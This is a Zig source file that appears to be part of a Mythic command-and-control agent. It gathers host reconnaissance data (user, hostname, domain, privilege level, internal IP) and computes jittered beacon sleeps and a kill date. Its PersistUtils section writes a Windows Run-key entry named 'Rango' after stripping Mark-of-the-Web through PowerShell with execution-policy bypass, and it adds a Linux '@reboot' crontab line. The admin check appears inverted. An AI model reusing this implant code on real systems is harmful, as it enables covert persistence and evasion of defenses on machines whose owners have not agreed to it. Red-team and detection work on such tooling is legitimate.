const std = @import("std");
const builtin = @import("builtin");
const crypto = std.crypto;
const Io = std.Io;
const base64 = std.base64;
const time = std.time;
const Allocator = std.mem.Allocator;
extern "shell32" fn IsUserAnAdmin() callconv(.winapi) bool;

pub const SystemInfo = struct {
    allocator: Allocator,
    io: Io,
    environ_map: *std.process.Environ.Map,

    pub fn init(allocator: Allocator, io: Io, environ_map: *std.process.Environ.Map) SystemInfo {
        return SystemInfo{
            .allocator = allocator,
            .io = io,
            .environ_map = environ_map,
        };
    }

    pub fn getCurrentUser(self: *SystemInfo) ![]const u8 {
        const key = if (builtin.os.tag == .windows) "USERNAME" else "USER";
        // getEnvVarOwned is deprecated, so we have to use Environ.Map. Feels a lot more cumbersome but it is what it is.
        // TODO: Ivestigate a bug where if packing with ZYRA, username is always "Unknown"
        if (self.environ_map.get(key)) |value| {
            return self.allocator.dupe(u8, value);
        } else {
            return self.allocator.dupe(u8, "Unknown");
        }
    }

    pub fn getHostname(self: *SystemInfo) ![]const u8 {
        if (builtin.os.tag == .windows) {
            if (self.environ_map.get("COMPUTERNAME")) |value| {
                return self.allocator.dupe(u8, value);
            } else {
                return self.allocator.dupe(u8, "Unknown");
            }
        } else {
            var hostname_buf: [64]u8 = undefined;
            const result = std.posix.gethostname(&hostname_buf) catch "Unknown";
            return try self.allocator.dupe(u8, result);
        }
    }

    pub fn getPid(self: *SystemInfo) ![]const u8 {
        if (builtin.os.tag == .windows) {
            const pid = std.os.windows.GetCurrentProcessId();
            return try std.fmt.allocPrint(self.allocator, "{d}", .{pid});
        } else {
            const pid = std.os.linux.getpid();
            return try std.fmt.allocPrint(self.allocator, "{d}", .{pid});
        }
    }

    pub fn getDomain(self: *SystemInfo) ![]const u8 {
        if (builtin.os.tag == .windows) {
            if (self.environ_map.get("USERDOMAIN")) |value| {
                return self.allocator.dupe(u8, value);
            } else {
                return self.allocator.dupe(u8, "Unknown");
            }
        } else {
            return try self.allocator.dupe(u8, "WORKGROUP"); // Default
        }
    }

    pub fn getIntegrityLevel(self: *SystemInfo) ![]const u8 {
        if (builtin.os.tag == .windows) {
            //Windows docs encourage using something else but who has time for that?
            //This function is a wrapper for CheckTokenMembership.
            //It is recommended to call that function directly to determine
            //Administrator group status rather than calling IsUserAnAdmin
            if (IsUserAnAdmin() != true) {
                return try self.allocator.dupe(u8, "4"); //high integrity
            } else {
                return try self.allocator.dupe(u8, "1"); //low integrity
            }
        } else {
            const euid = std.os.linux.geteuid();
            if (euid == 0) {
                return try self.allocator.dupe(u8, "4"); //high integrity to mean process is running as root
            } else {
                return try self.allocator.dupe(u8, "1"); //low integrity, process is normal user.
            }
        }
    }

    pub fn getExternalIP(self: *SystemInfo) ![]const u8 {
        return try self.allocator.dupe(u8, "0.0.0.0"); // Would need external service
    }

    pub fn getInternalIP(self: *SystemInfo) ![]const u8 {
        if (builtin.os.tag == .windows) {
            const result = std.process.run(self.allocator, self.io, .{
                .argv = &.{"ipconfig"},
            }) catch |err| {
                std.debug.print("{}\n", .{err});
                return try self.allocator.dupe(u8, "127.0.0.1");
            };
            defer self.allocator.free(result.stdout);
            defer self.allocator.free(result.stderr);
            var tokens = std.mem.splitAny(u8, result.stdout, "\n");
            const first_ip = tokens.first();
            while (tokens.next()) |line| {
                if (std.mem.find(u8, line, "IPv4 Address") != null) {
                    const ip_start = std.mem.find(u8, line, ":") orelse continue;
                    const ip_str = std.mem.trim(u8, line[ip_start + 1 ..], " \t\r\n");
                    if (ip_str.len > 0 and std.mem.find(u8, ip_str, ".") != null) {
                        return try self.allocator.dupe(u8, ip_str);
                    }
                }
            }
            if (first_ip.len == 0) {
                return try self.allocator.dupe(u8, "127.0.0.1");
            }
            return try self.allocator.dupe(u8, first_ip);
        } else {
            //we are going to run hostname -I and return the first IP address. I don't wanna use c library for this.
            const result = std.process.run(self.allocator, self.io, .{
                .argv = &.{ "hostname", "-I" },
            }) catch |err| {
                std.debug.print("{}\n", .{err}); //I should fix this later
                return try self.allocator.dupe(u8, "127.0.0.1");
            };
            defer self.allocator.free(result.stdout);
            defer self.allocator.free(result.stderr);
            var tokens = std.mem.splitAny(u8, result.stdout, " ");
            const first_ip = tokens.first();
            if (first_ip.len == 0) {
                return try self.allocator.dupe(u8, "127.0.0.1");
            }
            return try self.allocator.dupe(u8, first_ip);
        }
    }

    pub fn getProcessName(self: *SystemInfo) ![]const u8 {
        return try self.allocator.dupe(u8, "mythic_agent");
    }
};

pub const CryptoUtils = struct {
    allocator: Allocator,

    pub fn init(allocator: Allocator) CryptoUtils {
        return CryptoUtils{
            .allocator = allocator,
        };
    }

    pub fn generateSessionId(self: *CryptoUtils, io: Io) ![]const u8 {
        var session_bytes: [8]u8 = undefined;
        Io.random(io, &session_bytes);
        return try std.fmt.allocPrint(self.allocator, "{x}", .{std.mem.readInt(u64, &session_bytes, .big)});
    }

    pub fn generateAESKey(io: Io) [32]u8 {
        var aes_key: [32]u8 = undefined;
        Io.random(io, &aes_key);
        return aes_key;
    }
};

pub const TimeUtils = struct {
    pub fn sleep(io: Io, sleep_time: u64) !void {
        try Io.sleep(io, Io.Duration.fromNanoseconds(sleep_time * time.ns_per_s), .real);
    }

    pub fn calculateJitteredSleep(base_sleep: u32, jitter: f32, io: Io) u64 {
        const jitter_amount = @as(u64, @intFromFloat(@as(f64, @floatFromInt(base_sleep)) * jitter));

        const ts = Io.Timestamp.now(io, .real);
        var prng = std.Random.DefaultPrng.init(@intCast(ts.toNanoseconds()));
        const random_jitter = prng.random().intRangeAtMost(u64, 0, jitter_amount);

        return base_sleep + random_jitter - (jitter_amount / 2);
    }

    pub fn getCurrentTimestamp(io: Io) Io.Timestamp {
        return Io.Timestamp.now(io, .real);
    }

    pub fn isKillDateReached(kill_date: []const u8, io: Io) bool {
        // Would implement date parsing and comparison
        // Should ideally take kill date from config
        // convert to epoch time, and compare to current time
        const parsed_date = parseDate(kill_date) catch {
            return false;
        };
        const current_timestamp = @divTrunc(Io.Timestamp.now(io, .real).toNanoseconds(), std.time.ns_per_s);
        return current_timestamp >= parsed_date;
    }

    fn parseDate(date_str: []const u8) !i64 {
        //generic checks yada yada yada...
        if (date_str.len < 10) {
            return error.InvalidDateFormat;
        }
        const year = std.fmt.parseInt(i32, date_str[0..4], 10) catch {
            return error.InvalidYear;
        };
        const month = std.fmt.parseInt(u8, date_str[5..7], 10) catch {
            return error.InvalidMonth;
        };
        const day = std.fmt.parseInt(u8, date_str[8..10], 10) catch {
            return error.InvalidDay;
        };
        if (month < 1 or month > 12) {
            return error.InvalidMonth;
        }
        if (day < 1 or day > 31) {
            return error.InvalidDay;
        }
        return dateToTimestamp(year, month, day);
    }

    fn dateToTimestamp(year: i32, month: u8, day: u8) i64 {
        //True conversion happens in this function
        //Epoch time conversion in hard
        const days_in_month = [_]u8{ 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 };
        var total_days: i64 = 0;
        var y: i32 = 1970;
        while (y < year) : (y += 1) {
            if (isLeapYear(y)) {
                total_days += 366;
            } else {
                total_days += 365;
            }
        }

        var m: u8 = 1;
        while (m < month) : (m += 1) {
            total_days += days_in_month[m - 1];
            // Add extra day for February in leap years
            if (m == 2 and isLeapYear(year)) {
                total_days += 1;
            }
        }
        total_days += @as(i64, day) - 1; // -1 because we count from day 0
        return total_days * 24 * 60 * 60;
    }

    fn isLeapYear(year: i32) bool {
        return (@rem(year, 4) == 0 and @rem(year, 100) != 0) or (@rem(year, 400) == 0);
    }
};

pub const PersistUtils = struct {
    pub fn installCron(agent_path: []const u8, allocator: std.mem.Allocator, io: Io) !void {
        if (builtin.os.tag == .windows) {
            const existing = try std.process.run(allocator, io, .{
                .argv = &.{
                    "reg.exe",
                    "query",
                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "/v",
                    "Rango",
                },
            });

            defer allocator.free(existing.stdout);
            defer allocator.free(existing.stderr);
            const reg_exists = existing.term.exited == 0;
            if (reg_exists and std.mem.find(u8, existing.stdout, agent_path) != null) {
                return error.AlreadyPersistent;
            }

            const unblock_cmd = try std.fmt.allocPrint(allocator, "Unblock-File -Path \"{s}\"", .{agent_path});
            defer allocator.free(unblock_cmd);
            const remove_motw = try std.process.run(allocator, io, .{
                .argv = &.{ "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", unblock_cmd },
            });
            defer allocator.free(remove_motw.stdout);
            defer allocator.free(remove_motw.stderr);
            if (remove_motw.term.exited != 0) {
                return error.UnblockFileFailed;
            }
            const result = try std.process.run(allocator, io, .{
                .argv = &.{
                    "reg.exe",
                    "add",
                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "/v",
                    "Rango",
                    "/d",
                    try std.fmt.allocPrint(allocator, "\"{s}\"", .{agent_path}),
                    "/f",
                },
            });
            defer allocator.free(result.stdout);
            defer allocator.free(result.stderr);

            if (result.term.exited != 0) {
                return error.RegistryWriteFailed;
            }
        } else {
            const existing = std.process.run(allocator, io, .{
                .argv = &.{ "crontab", "-l" },
                .stdout_limit = .limited(8192),
                .stderr_limit = .limited(8192),
            }) catch |err| {
                // proceed with empty if none exists(crontab)
                if (err == error.ChildExecFailed) {
                    return error.CrontabNotAvailable;
                }
                return err;
            };
            defer allocator.free(existing.stdout);
            defer allocator.free(existing.stderr);
            const cron_line = try std.fmt.allocPrint(allocator, "@reboot {s} &\n", .{agent_path});
            defer allocator.free(cron_line);

            if (std.mem.find(u8, existing.stdout, agent_path) != null) {
                return; // already persistent
            }
            const combined = try std.mem.concat(allocator, u8, &[_][]const u8{ existing.stdout, cron_line });
            defer allocator.free(combined);

            const write_proc = try std.process.spawn(io, .{
                .argv = &[_][]const u8{ "crontab", "-" },
                .stdin = .pipe,
                .stdout = .inherit,
                .stderr = .inherit,
            });

            if (write_proc.stdin) |stdin| {
                try stdin.writeStreamingAll(io, combined);
                stdin.close(io);
            }

            // _ = write_proc.wait() catch |err| {
            //   std.log.err("Failed to write crontab: {}", .{err});
            //   return error.CrontabWriteFailed; // Should handle this properly because of a panic in my tests:(
            //};
        }
    }
    pub fn removeCronEntry(agent_path: []const u8, allocator: std.mem.Allocator, io: Io) !void {
        if (builtin.os.tag == .windows) {
            const existing = try std.process.run(allocator, io, .{
                .argv = &.{ "reg.exe", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Rango", "/f" },
            });
            if (existing.term.exited != 0) {
                return error.RegistryDeleteFailed;
            }
            defer allocator.free(existing.stdout);
            defer allocator.free(existing.stderr);
        } else {
            const existing = std.process.run(allocator, io, .{
                .argv = &.{ "crontab", "-l" },
                .stdout_limit = .limited(8192),
                .stderr_limit = .limited(8192),
            }) catch |err| {
                if (err == error.ChildExecFailed) return; // nothing to remove no crontab
                return err;
            };
            defer allocator.free(existing.stdout);
            defer allocator.free(existing.stderr);
            var list = std.ArrayList([]const u8).empty;
            defer list.deinit(allocator);

            // Split into lines and filter out any containing our agent path
            var it = std.mem.splitAny(u8, existing.stdout, "\n");
            while (it.next()) |line| {
                if (std.mem.find(u8, line, agent_path) == null and line.len > 0) {
                    try list.append(allocator, line);
                }
            }
            const filtered = try std.mem.join(allocator, "\n", list.items);
            defer allocator.free(filtered);

            const write_proc = try std.process.spawn(io, .{
                .argv = &[_][]const u8{ "crontab", "-" },
                .stdin = .pipe,
                .stdout = .inherit,
                .stderr = .inherit,
            });

            if (write_proc.stdin) |stdin| {
                try stdin.writeStreamingAll(io, filtered);
                try stdin.writeStreamingAll(io, "\n");
                stdin.close(io);
            }
        }
        //_ = write_proc.wait() catch {};//line caused a panic in my tests, commenting out for now
    }
    pub fn getCronEntries(allocator: std.mem.Allocator, io: Io) !?[]const u8 {
        if (builtin.os.tag == .windows) {
            const result = try std.process.run(allocator, io, .{
                .argv = &.{
                    "reg.exe",
                    "query",
                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "/v",
                    "Rango",
                },
            });

            defer allocator.free(result.stdout);
            defer allocator.free(result.stderr);

            if (result.term.exited != 0) {
                return try allocator.dupe(u8, "");
            }
            return try allocator.dupe(u8, result.stdout);
        } else {
            const result = try std.process.run(allocator, io, .{
                .argv = &.{ "crontab", "-l" },
                .stdout_limit = .limited(8192),
                .stderr_limit = .limited(8192),
            });
            defer allocator.free(result.stdout);
            defer allocator.free(result.stderr);
            const out = result.stdout;
            var filtered_lines = std.mem.tokenizeAny(u8, out, "\n");
            while (filtered_lines.next()) |line| {
                if (std.mem.startsWith(u8, std.mem.trim(u8, line, " \t"), "@reboot")) {
                    var parts = std.mem.tokenizeScalar(u8, line, ' ');
                    _ = parts.next(); // skip "@reboot"

                    if (parts.next()) |path| {
                        return try allocator.dupe(u8, path);
                    }
                }
            }
            return null; // No entry found
        }
    }
    pub fn updateCronEntry(old_path: []const u8, new_path: []const u8, allocator: std.mem.Allocator, io: Io) !void {
        try PersistUtils.removeCronEntry(old_path, allocator, io);
        try PersistUtils.installCron(new_path, allocator, io);
    }
};
